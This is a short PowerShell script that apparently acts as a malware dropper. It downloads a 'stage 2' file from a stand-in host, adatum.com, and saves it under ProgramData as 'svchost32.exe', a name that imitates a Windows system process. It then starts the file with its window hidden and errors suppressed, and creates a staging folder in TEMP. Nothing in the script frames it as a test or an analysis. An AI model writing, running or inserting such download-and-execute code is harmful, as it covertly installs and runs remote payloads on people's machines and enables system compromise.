
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://adatum.com/updater.ps1',
    [string]$WorkingPath = "C:\ProgramData\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath)
Start-Process -FilePath $WorkingPath -WindowStyle Hidden -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
